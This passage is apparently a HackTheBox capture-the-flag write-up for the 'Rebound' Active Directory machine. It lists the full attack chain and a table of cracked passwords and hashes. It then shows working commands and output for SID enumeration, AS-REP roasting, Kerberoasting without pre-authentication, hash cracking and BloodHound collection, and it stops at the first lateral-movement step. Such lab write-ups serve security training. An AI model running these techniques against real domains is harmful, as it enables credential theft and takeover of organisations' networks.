---
layout: ctf
title: "HackTheBox: Rebound"
platform: "HackTheBox"
type: "Machine"
difficulty: "Insane"
image: "/assets/img/ctf/rebound.png"
tags: [Windows, Active-Directory, SID-Enumeration, AS-REP-Roasting, Kerberoasting, Password-Cracking, BloodHound, Password-Spraying, ACL-Abuse, Shadow-Credentials, Pass-the-Hash, Cross-Session-Attack, NTLM-Relay, DCOM-Coercion, gMSA-Abuse, Resource-Based-Constrained-Delegation, RBCD, Constrained-Delegation, S4U2Self, S4U2Proxy, Pass-the-Ticket, DCSync]
date: 2026-06-16
---

# 🎯 Rebound

**OS:** Windows | **Difficulty:** Insane | **IP:** `10.129.232.31`

![rebound.htb](/assets/img/ctf/data/rebound-htb.png)

---

## ⛓️ TL;DR / Attack Chain
1. **Foothold:** Grabbed initial access by Kerberoasting the `ldap_monitor` account and cracking the hash.
2. **Lateral Movement (`ldap_monitor` to `oorend`):** Used BloodHound to discover that `ldap_monitor` could add members to the `SERVICEMGMT` group. Added `oorend` to the group and verified access via password spraying.
3. **Lateral Movement (`oorend` to `winrm_svc`):** Abused oorend's new rights to modify DACLs over the `Service Users` OU. Executed a Shadow Credentials attack to grab the NTLM hash for `winrm_svc`.
4. **Lateral Movement (`winrm_svc` to `tbrady`):** Performed a cross-session NTLM relay attack using `RunasCs.exe` and `KrbRelay.exe` to coerce authentication from `tbrady`, who was also logged into the machine. Cracked the relayed NTLMv2 hash.
5. **Lateral Movement (`tbrady` to `DELEGATOR$`):** Used tbrady's credentials to read the `msDS-ManagedPassword` (gMSA password) for the `DELEGATOR$` account.
6. **PrivEsc:** Configured Resource-Based Constrained Delegation (`RBCD`) on `DELEGATOR$` using `ldap_monitor`. Impersonated the domain controller (`DC01$`) to forward a ticket and successfully dump the Administrator hash via DCSync.

---

## 🔑 Loot & Creds

| User | Credential | Where / How |
| :--- | :--- | :--- |
| **ldap_monitor** | `1GR8t@$$4u` | Kerberoasting without pre-authentication. |
| **oorend** | `1GR8t@$$4u` | Password spraying (reused ldap_monitor's password). |
| **winrm_svc** | `4469650fd892e98933b4536d2e86e512` | Shadow Credentials attack via full control over the target OU. |
| **tbrady** | `543BOMBOMBUNmanda` | Cross-session NTLM relay attack using KrbRelay. |
| **DELEGATOR$** | `b6e1691909135eced572c9f32092ff9a` | Read gMSA password using bloodyAD. |
| **Administrator** | `176be138594933bb67db3b2572fc91b8` | DCSync attack after abusing RBCD and Constrained Delegation. |

---

## 🔧 0. Setup & Global Variables
*Run this in your terminal once so you can copy-paste the rest of the commands blindly.*

```bash
$ IP="10.129.232.31" ; DOMAIN="rebound.htb" && \
  # sudo timedatectl set-ntp off && \ # this in case ntpdate's work is reset automatically
  sudo ntpdate $DOMAIN ;
  echo "$IP $DOMAIN dc01.$DOMAIN" | sudo tee -a /etc/hosts
```

---

## 🔍 1. Enumeration

### Nmap
```bash
$ mkdir -p nmap && nmap -sV -sC -p- $IP -oA ./nmap/nmap
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-16 14:40 +0200
Nmap scan report for rebound.htb (10.129.232.31)
Host is up (0.030s latency).
Not shown: 65510 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-16 19:41:08Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-06-16T19:42:12+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
|_ssl-date: 2026-06-16T19:42:11+00:00; +7h00m01s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
|_ssl-date: 2026-06-16T19:42:12+00:00; +7h00m02s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
|_ssl-date: 2026-06-16T19:42:11+00:00; +7h00m01s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49695/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
49724/tcp open  msrpc         Microsoft Windows RPC
49745/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s
| smb2-time:
|   date: 2026-06-16T19:42:03
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.33 seconds
```

### SMB

Null auth?

```bash
$ nxc smb $IP -u '' -p '' -M spider_plus
/usr/local/lib/python3.13/dist-packages/requests-2.27.1-py3.13.egg/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (2.6.3) or chardet (5.2.0)/charset_normalizer (3.4.4) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
SMB         10.129.232.31   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\:
SPIDER_PLUS 10.129.232.31   445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.232.31   445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.232.31   445    DC01             [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.232.31   445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.232.31   445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.232.31   445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.232.31   445    DC01             [*]  OUTPUT_FOLDER: /home/tralsesec/.nxc/modules/nxc_spider_plus
SMB         10.129.232.31   445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
SPIDER_PLUS 10.129.232.31   445    DC01             [+] Saved share-file metadata to "/home/tralsesec/.nxc/modules/nxc_spider_plus/10.129.232.31.json".
SPIDER_PLUS 10.129.232.31   445    DC01             [*] Total folders found:  0
SPIDER_PLUS 10.129.232.31   445    DC01             [*] Total files found:    0
```

Works but nothing. Let's look for users:

```bash
$ impacket-lookupsid tralsesec@$IP 10000 -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Brute forcing SIDs at 10.129.232.31
[*] StringBinding ncacn_np:10.129.232.31[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: rebound\Administrator (SidTypeUser)
501: rebound\Guest (SidTypeUser)
502: rebound\krbtgt (SidTypeUser)
512: rebound\Domain Admins (SidTypeGroup)
513: rebound\Domain Users (SidTypeGroup)
514: rebound\Domain Guests (SidTypeGroup)
515: rebound\Domain Computers (SidTypeGroup)
516: rebound\Domain Controllers (SidTypeGroup)
517: rebound\Cert Publishers (SidTypeAlias)
518: rebound\Schema Admins (SidTypeGroup)
519: rebound\Enterprise Admins (SidTypeGroup)
520: rebound\Group Policy Creator Owners (SidTypeGroup)
521: rebound\Read-only Domain Controllers (SidTypeGroup)
522: rebound\Cloneable Domain Controllers (SidTypeGroup)
525: rebound\Protected Users (SidTypeGroup)
526: rebound\Key Admins (SidTypeGroup)
527: rebound\Enterprise Key Admins (SidTypeGroup)
553: rebound\RAS and IAS Servers (SidTypeAlias)
571: rebound\Allowed RODC Password Replication Group (SidTypeAlias)
572: rebound\Denied RODC Password Replication Group (SidTypeAlias)
1000: rebound\DC01$ (SidTypeUser)
1101: rebound\DnsAdmins (SidTypeAlias)
1102: rebound\DnsUpdateProxy (SidTypeGroup)
1951: rebound\ppaul (SidTypeUser)
2952: rebound\llune (SidTypeUser)
3382: rebound\fflock (SidTypeUser)
5277: rebound\jjones (SidTypeUser)
5569: rebound\mmalone (SidTypeUser)
5680: rebound\nnoon (SidTypeUser)
7681: rebound\ldap_monitor (SidTypeUser)
7682: rebound\oorend (SidTypeUser)
7683: rebound\ServiceMgmt (SidTypeGroup)
7684: rebound\winrm_svc (SidTypeUser)
7685: rebound\batch_runner (SidTypeUser)
7686: rebound\tbrady (SidTypeUser)
7687: rebound\delegator$ (SidTypeUser)
```

That's all domain users / machines. Let's generate a user file:

```bash
$ impacket-lookupsid tralsesec@$IP 10000 -no-pass | grep 'SidTypeUser' | awk '{ print $2 }' | awk -F '\\' '{ print $2 }' > users.txt
```

---

## 🚪 2. Initial Foothold

AS-REP Roasting:

```bash
$ impacket-GetNPUsers -usersfile users.txt $DOMAIN/ -dc-ip $IP
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ppaul doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User llune doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fflock doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$jjones@REBOUND.HTB:7e782aabf72788e9675468612e82aca6$b629350d4eff22277445d5c55305a2387da3d2dc1f7367f80e055674f9bd87843eecc65b43bfc8f444b56dac353d25855965eeed1dacfa97f6eb0a45dec21e709264e1a04db97e53abe7954f1c3d15229525e9459490306827c62bd99403d26e42f789eca6d9e8cb8380518ea3a89117170a204247c9c69d66762f78dfeeb9c5963693ccc3a170f99916feed0046b20a12247a2d5cfbc541e659779ce075b70df0d36de9ac89579251b000402db2834386f77c540328b767dc161b25960d414976409519b0293add4eb9c0666f7ff9d72dcc5473529a082690d055723953433b49b8d8f7d836fef8f499
[-] User mmalone doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nnoon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ldap_monitor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User oorend doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User winrm_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User batch_runner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tbrady doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User delegator$ doesn't have UF_DONT_REQUIRE_PREAUTH set
```

`jjones` is vulnerable. Let's crack his password:
```bash
$ echo '$krb5asrep$23$jjones@REBOUND.HTB:7e782aabf72788e9675468612e82aca6$b629350d4eff22277445d5c55305a2387da3d2dc1f7367f80e055674f9bd87843eecc65b43bfc8f444b56dac353d25855965eeed1dacfa97f6eb0a45dec21e709264e1a04db97e53abe7954f1c3d15229525e9459490306827c62bd99403d26e42f789eca6d9e8cb8380518ea3a89117170a204247c9c69d66762f78dfeeb9c5963693ccc3a170f99916feed0046b20a12247a2d5cfbc541e659779ce075b70df0d36de9ac89579251b000402db2834386f77c540328b767dc161b25960d414976409519b0293add4eb9c0666f7ff9d72dcc5473529a082690d055723953433b49b8d8f7d836fef8f499' > jjones

$ john --wordlist=/usr/share/wordlists/rockyou.txt ./jjones
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:05 DONE (2026-06-16 14:48) 0g/s 2503Kp/s 2503Kc/s 2503KC/s !)(OPPQR..*7¡Vamos!
Session completed.
```

Unfortunetaly, we couldn't crack his password (not in `rockyou.txt` at least). But we can try to Kerberoast `jjones` even without credentials:
```bash
$ impacket-GetUserSPNs -no-preauth jjones -request -usersfile users.txt $DOMAIN/ -dc-ip $IP
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$18$krbtgt$REBOUND.HTB$*krbtgt*$75224f6e7a26e64e48ec1cad$4b0fd82ba4f4e029c822438d9e8a61855034cd94b74c2f08a197d243d5c4ee2d61e9e769edb673f83a73a48b81d6bbd8d255d00e910648cae60f1736a9bd9f6b7ff3328e08742d30026c56219ba15e7767883219bf77fdea082032070ba9d6f7f21b45aee0c7d10d7c3d07eb959fd06f2c0f37b56aad83244567ea43631913dd103296a4ae28c9d15c1abd7a3c560e00d129baba522829953afc64b24650337f4fcf4c65bb5e40d80382cc3543e185f4024d66cd812f58851358a102f7c16f1077bdf564432d96f536b9bde2cbeab98bf9f9a86d5830bcb089e19f519ed75dd786ca4a1ebfc860202bc1d23e619057a1136799912ca7ae71c22503afb52bf84996c1c2aa138407eb904082bdd3070f21b27bb01464e466a9413ecdbd90ac6089596dbb3b94c4e18a185241f9f92921044ba5c2345f6bf69e1bfcc9ddc2b6a3c44ac986d8dc5575df17c03417a22927b7d3de2ace736060f6eaa36626232b7570dbea97067960d8d02a15cc997f18c3cf92828633381de02f57dda38f97c9b584b5ea441f76698312ff072bdd1a697c88dfe0f057260bf59dc001bca06e3edfbc4da298bc954b088b1be7377cd87d18305a4ce9b5758618831ed71a70a19150dc77119f634910ce68c8173960d047f2ed0adc3eaf9dbb8e2eae9ca96e9e718d9e59ddc718368a0c7ea31ac035eac60725257c7873e98d8990ae2e17b3548690dcc380c15b94b462c0139f485c52dce1016642590c9bbabc92fdb0a3da7a7558e5a3f18bee732c3f56d1a5e48f988c48a52794b884bee706b15998256d702694be7643671af8be0e5073da01abe5f0f2c89aab6974c7b855ac1f54ae65b23c28b78630b3793feb069847403075909ffe0b19503a03cf8aff34852cab49771cf140072782dbb0de893870a9903b2c7d750c3839a01d8233777e8cc134a8c41c4f1d756b43548ada008794964f0836e9e46d740cadb6377bf8b0a1e93d6c4c00fcb7cce45b578835971a4678ed60de4c562773d014d4cb3ad23d76ca02374bfa688f1e0e6c6fd6673373ca7c3c7e56e8b2cadb56e211ecf56da47502579063b1860797c747dee500b8734ef794377a29b596fa6d9c51de47994f852006da26eaa2238d055463f5c6a936db3d364c25627194049d5d01ba1ef9e26cf8e49dbe02f805bbd702a67a4ac312a947c28cd7fad54f21e59d49cff5b64d0071fe960abfdb4431a0ca0978da6acb7c2e9beea75a627ef9b859eb4010d93f48e91153dffd790fdbf524147bc0726c5048480fd443b778b738f1cb11ac5950606c791c88ec58c24a596969801693f999ad11ac39e0f12dc9e62373702290d0fe151d26f240fa09d15a181cd3baa31ee45994fdeb78a5675f1cec0bc4023dd48f5b88890859b6771f346f178f06e07bb022dccdcbd11a0d7f9c41e576550e5f905857592a076faf670540afcd5062616ce304c2c302a08bee78
$krb5tgs$18$DC01$$REBOUND.HTB$*DC01$*$0cafdbf831e0df44a0880588$15f782130e92723fd2e745e9aaaf3057e0b26495a881c998db0447f90067db65978446cb8a19b5de43ebb13a4f432f95d32fab1ceca4b3ed3fc5bd893ab586ce1c3abd66caf72aca478c8aba67c47ad17586e098f384b2a7f2a14f11322cecd5896541956cd5c5e9d2d833817acdea67ecf6187584eebb4d83ba8b1a2fa45cbc7c239061dbbddcfcb738cfc0ad654e3c6bbcf4bd930502301243ca60cdce767bb4923f7f9028bad15535d44d52b4bce9cd63c1b2938eae2f93b5eff6cc8ad67bd742ba34059a56a9a58d072200c36ca86b0cd5b7339b44a5b996faea4dad63a37d974fbe7f38e2392e32dbd4053f440b6d661411348c28cda16a468bb04ff9521026c76e39338b2906a84e9ab622931920707ddeb2d0256d89bed1342c0483bb8ef82d6fdd79e8d5c8fbe699c758533ab9714c6750d642a8c448e5fde81b09b7afa40324c37b80a2a88438ec1bec6f9982a6a52088f7857d33d3e3b4faa7105fa8098ada9c888d8e034a2b866127f8b750bd4e1d04d15637a166ddc3a0ded6db7d96317528f69f5456db07576da7e793266f6f6e4eea5f86c8a71aebcb504b4a75652032630cd499c3df1a4a7fe6621df05e01015a97e12d349374739ac0cadf2565a36a203c920d40fb305c963da468677956367a36d4f34f1e54cc2838e7015d8e8ac636356166631b6c4db49c7804f2c353d560ac2df262130f3092f3a6788334c9390534989674cd8239d6c1decc6f3e896eede1cd44eb3e232d4fe4daaca053c44b959a55c2f366ab06054c3cbd74f63227636230a46125d3e847642e85fce98ef254eca36c63c0f427112bd2c1d763589cbf6a40c99584356bd16bdd14f02b79d5420a29596ddc6f179cd9aab6d500d71712db6bb1112dbd61fcdcb9f543660e127e573486dd195573e312124b592e0f2426171f3bdbb85fe26e79fdfff566bc52ef2ed3c69962cd11d46c3c7eba8f95ed2393ac395f96136c4bc598d6b6ac46951c18bdd049b858d2605c09db016898575bc614141dac95fa82c35fa35bd63d414b937a79fd72d10625077a0531559a23194aab126670f388964b756cdb1d56e3990e1f5e2302982f5dd74143066a7451d57ea77848a031af4a3e5b4f4a6bcbe752b7b69ce4d2be89879a652e9f78e4f4059af44ec0485c2cd077ca0a0e0e66e0f09ff91961f72d8fc5f4aaf8a34a3a0e45a03fc610903671845a5c819aa71d363bc05c0793ca80a79163bdca56a749c85a98f017cb23194c71b64eac7e15d9a6a47a1f54d093e8d3f2be259d2cb14ba09c019fea15064bce65c398cbcff1496aa5558cb57ecaf09035bb54de973f806a6647b84ae9c91bd58150dd50edadfd1fbd71453e66c6
[-] Principal: ppaul - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: llune - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: fflock - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: jjones - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: mmalone - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: nnoon - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$c6dd52bcfeb695a924944dc69d42177b$44fdfc264eba5ae3e2f8632dee78930a730268d93e62036871e5d9fc5792ab587072c465ddad27cbb57c00962404bbbe7e339256ee2b8c2974ca577a0c4629f67273cdd9957c53fbecc4e41669fcfd2f84e0f475c1316e7b31c99e1ec661817b4872a19df5e133595cf56fcfda35b3c90b0c112d7226861d13cb4e54fd1c817d45a62e0cae636bece8276581df8c3e60cdcb616340557ac9c5da0458d404a479ecebbfea73413e1e3894a034827679b92e810b1e8ace1b02fc6ffb3c427d78c5ea818c7254c1bc0fbee9bc234a80b3326ad0bdbd28fcff7e010d388e8ee9651c79835ec3a086e29d7bc005be8ae393693d24cfb055b0d1c58b44ee0c548a352e7701f5519f792146d8f90219476b1a67d4c4a8f41d76707461518710d56b3e11a308685944d936d5382b4be00fa19ec512278edd04826bceced57203a5e596abba4a2270f4e509d33ed0154417c81ede182f0aa7ade7a58115e3ea9ff7191df522b0eed3f8c5017ff5f8737c7f37260e4ad090bed3ce185d204a3fc6a69683bdf9fdba937b5f9a716220aa0cbbdc3ec97391e0c60b5404c7b4879389427f7c587d8f39414223f3d2d5bfd4460c6d48928b7c3cf411bbe436436f61177e69bb98a641324d321c738e202bf33752e440345b14a7dca408b68df87eefb878b075b4f81046696b35a6e0be1bbe82e82e1d0c775b4370cecbdb5eb3af0d6294f269b26eccec83a4f2b53791140932ab3bba1a59a3bf35693fca07dc7faa3fc8e8b5e2355eaa526ca6f1fe776adb70c42839d9e38a85d738319cb6175f35f9abb375f5b4252707f9ea7929465a27656bf83c3d7d78265d94237e88b81f7639b9d6dd57c25f3c29874667292ada97f8d1e52ad9514a921898078bb2c0bf500f2d690f7956f441fbf7d671570421d5a0bdc94d0ffe4695ad6aaf59d682559d03eeb722d9db4306b2a1f2845570deb166ec73f2fa0b40a034c79b637ecc85068443522679b3168e54120e00137419a0019b5c5916bd2e04ae093d82f9be0efa5396a59d10d06f9233f0e0f90c00cd560bf2e4b58f78773a1ac3877237fee09331633dc3acec5e518de9d59874993552c8adf363698980acd538bb04c6cf5e9b3a229eece0070efea2476992f7535e6582c0849c8a27d9f0d1e6ebd49c04402952e76e06d9330d250a1553a883cade28bf10be69bffd8fd9d0bdaadc7fc897fbc88b86f4066600c123ebe72fb565e30febade8ef47307c9b11c5dba2a26e0b95a1b4633095b0952049c8c3a94845389998479909a1da180b8fe7c947d29a7b1b3ad7bb39205d176c44989fbd3a281bc792c0a82492deea262befeaf85fb7f64b0c0dbcc80d3cb0
[-] Principal: oorend - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: winrm_svc - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: batch_runner - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: tbrady - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$18$delegator$$REBOUND.HTB$*delegator$*$39bef95a3dc2ce4a29aa3acf$f651371e55a92ae29bf800cafada3a6111f1c23f1fe4acd531f14e32ef1a7e51123964548c2834ff0e65d1ce7b5deb8fa8d777d3162ae80704e357b534d8685858f0f3a5b2be8fc58684565e39df2bdb21deb80f69126bc70580f1292536531e7a378c2314d57d388aa42bc54a33057abb986e14d51b425ae1f7132d68981f0716b48c179c0f2e3a172bbc30a8af1868d50a301781af4ca46a4ae9775b18da5685693fc8bee9bceee21f9c6682cba9e56e3d73b920c4da6a8e0a749f2a9c4c5e4215025ebab5d40134235af2448f39e6f9a68d9ccbb7f739bf77639e01d1a74a7812cf9f1499a90c4d44f3eea8d0026e5cb3cc9aa067cf8b4c10dfbba5af4ee96da3d160803982656476a0086def2dff0c3fe2268b733a5dffd98acad78738f9b0f22a255f06f4710678e8d24787ed113e9da1c94bba83bf59b3423fa9d6421cf3711fea7fd4cbb150ba59ce0c9d04332127f4659d1e3581b267f6e032e412b189d431d245f412ee7934b072428b4de68fe4cdbd0641d8fa9f920347976c9c6dd23f71faf90698821415bfc54dcb6987aff30784b8de63d226213e04687ec74c8bf779b5240ad6137c4be2dbf7e0fa920181b7471d3b7dddde1a4dfcd7378b51f80ff741ca1146394ea525b56f3e8afb3d455b2a8f1e7105662813d4570be4fd78c53d686e5cba69ceeb5c674c76c750a505604eb346f9ceef18705d8b9788c48f8ddf58ff3cd5f2b768048db25d2c88a7790454faf5392deaf163e195b80cfad1ac7f69aa2824baf2c50fbe257c740e6e9698ad47312139b10ce555bc616dc3cf788c665d1e3eb065912f5ac31fd1bbc6a0e1b39ad02ba553ba47556f1952be9d4ae97fcd3ca29668abd9c21ce70f69e09455ab53e5b6712654a61adb20f5c93e48c2f389ee2b74d9143ed9773c88e6f97fb0c48a922a22c9970c57ca1fb28895a0a3b837f0fd3ede803ae0d226341d82e380c5a50df905307b5b65b57e3942945bd0003f78472a02812832c0ea6c43b2589015d3e34303dcdce85827563b842d490b195ea3a792981fc7c25c278f5d0ca8b629ab8a3d8c71c0615b4cd1a1f30d1171f4ad9cf87549445d21603396cead39774e1e2f3bb6664362c89fd2c67741347574333bacee77a5e15aff9eb8e0352743d0938186e5c9ede4461f5b4d019caf7e4666cf5e92d1b8f3c6a4cd6100e36438ffb5215514e088ff0272c0afbdfc40a2c2171f905253ff7571c5fc579973cfded46d7f8746260ca4a3bcd5410079581531f3a2f873e8c149f2a9026a86da88ed5fef0dc1d5a6f8944ffc7e399bc5c4ddcedec9ae4a6e08513114709cf3d5b063c9e7567f0745f4613f98166c12bf4a4ce9f6373e825ba2
```

We were able to kerberoast `delegator$`, `dc01$` and `krbtgt`. Although we might use their hashes with john to attempt to crack them, we won't be able to as machine accounts and `krbtgt` and such are secured with randomly generated and extremly complex passwords. So we'll focus on `ldap_monitor`:
```bash
$ echo '$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$c6dd52bcfeb695a924944dc69d42177b$44fdfc264eba5ae3e2f8632dee78930a730268d93e62036871e5d9fc5792ab587072c465ddad27cbb57c00962404bbbe7e339256ee2b8c2974ca577a0c4629f67273cdd9957c53fbecc4e41669fcfd2f84e0f475c1316e7b31c99e1ec661817b4872a19df5e133595cf56fcfda35b3c90b0c112d7226861d13cb4e54fd1c817d45a62e0cae636bece8276581df8c3e60cdcb616340557ac9c5da0458d404a479ecebbfea73413e1e3894a034827679b92e810b1e8ace1b02fc6ffb3c427d78c5ea818c7254c1bc0fbee9bc234a80b3326ad0bdbd28fcff7e010d388e8ee9651c79835ec3a086e29d7bc005be8ae393693d24cfb055b0d1c58b44ee0c548a352e7701f5519f792146d8f90219476b1a67d4c4a8f41d76707461518710d56b3e11a308685944d936d5382b4be00fa19ec512278edd04826bceced57203a5e596abba4a2270f4e509d33ed0154417c81ede182f0aa7ade7a58115e3ea9ff7191df522b0eed3f8c5017ff5f8737c7f37260e4ad090bed3ce185d204a3fc6a69683bdf9fdba937b5f9a716220aa0cbbdc3ec97391e0c60b5404c7b4879389427f7c587d8f39414223f3d2d5bfd4460c6d48928b7c3cf411bbe436436f61177e69bb98a641324d321c738e202bf33752e440345b14a7dca408b68df87eefb878b075b4f81046696b35a6e0be1bbe82e82e1d0c775b4370cecbdb5eb3af0d6294f269b26eccec83a4f2b53791140932ab3bba1a59a3bf35693fca07dc7faa3fc8e8b5e2355eaa526ca6f1fe776adb70c42839d9e38a85d738319cb6175f35f9abb375f5b4252707f9ea7929465a27656bf83c3d7d78265d94237e88b81f7639b9d6dd57c25f3c29874667292ada97f8d1e52ad9514a921898078bb2c0bf500f2d690f7956f441fbf7d671570421d5a0bdc94d0ffe4695ad6aaf59d682559d03eeb722d9db4306b2a1f2845570deb166ec73f2fa0b40a034c79b637ecc85068443522679b3168e54120e00137419a0019b5c5916bd2e04ae093d82f9be0efa5396a59d10d06f9233f0e0f90c00cd560bf2e4b58f78773a1ac3877237fee09331633dc3acec5e518de9d59874993552c8adf363698980acd538bb04c6cf5e9b3a229eece0070efea2476992f7535e6582c0849c8a27d9f0d1e6ebd49c04402952e76e06d9330d250a1553a883cade28bf10be69bffd8fd9d0bdaadc7fc897fbc88b86f4066600c123ebe72fb565e30febade8ef47307c9b11c5dba2a26e0b95a1b4633095b0952049c8c3a94845389998479909a1da180b8fe7c947d29a7b1b3ad7bb39205d176c44989fbd3a281bc792c0a82492deea262befeaf85fb7f64b0c0dbcc80d3cb0' > ldap_monitor

$ john --wordlist=/usr/share/wordlists/rockyou.txt ./ldap_monitor
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1GR8t@$$4u       (?)
1g 0:00:00:03 DONE (2026-06-16 14:54) 0.2695g/s 3515Kp/s 3515Kc/s 3515KC/s 1Gobucs!..1BLESSING
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Here we go! `ldap_monitor`:`1GR8t@$$4u`!

---

## 🤸 3.1 Lateral Movement (`ldap_monitor` -> `oorend`)

```bash
$ bloodhound-python -u ldap_monitor -p '1GR8t@$$4u' -d $DOMAIN -dc dc01.$DOMAIN -ns $IP -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: rebound.htb
